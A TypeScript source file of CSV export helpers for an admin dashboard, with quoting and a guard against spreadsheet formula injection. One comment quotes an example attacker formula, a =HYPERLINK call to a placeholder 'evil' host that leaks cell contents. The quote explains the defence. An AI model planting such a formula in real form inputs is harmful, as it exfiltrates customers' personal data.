// Browser-only CSV export helpers. Used by admin surfaces that let SAV /
// compta download a sliced view of a table (waitlist, commandes, …).
//
// RFC 4180-ish escaping: every field is wrapped in double quotes and any
// internal quote is doubled. Without this, an email with a comma or a value
// with a newline silently breaks the CSV layout (one row spread across two,
// columns shifting). Since these files are imported into Brevo / Excel, a
// malformed row = silent data loss.
//
// Formula-injection guard: Excel / LibreOffice evaluate any cell starting
// with =, +, -, @, \t, or \r as a formula — even when the cell came from a
// quoted CSV field. Several columns we export contain text from public
// forms (b2b_quotes.message, school_lists.raw_text, customer names from
// Shopify…). An attacker who submits `=HYPERLINK("https://evil/?d="&A2,…)`
// in the public devis form turns the SAV CSV download into a one-click
// PII exfiltration. Prepending a single quote is the OWASP-recommended
// neutralizer — Excel renders it as text, the leading quote is invisible.

const FORMULA_PREFIX = /^[=+\-@\t\r]/;

export const csvEscape = (value: unknown): string => {
  let s = value == null ? '' : String(value);
  if (FORMULA_PREFIX.test(s)) s = "'" + s;
  return `"${s.replace(/"/g, '""')}"`;
};

export const buildCsv = (headers: string[], rows: unknown[][]): string => {
  const headerLine = headers.map(csvEscape).join(',');
  const bodyLines = rows.map((row) => row.map(csvEscape).join(','));
  return [headerLine, ...bodyLines].join('\n');
};

// BOM prefix forces Excel (Windows FR locale) to read UTF-8 instead of
// guessing CP1252 — without it, accents come out mojibake.
export const downloadCsv = (filename: string, csv: string): void => {
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
};
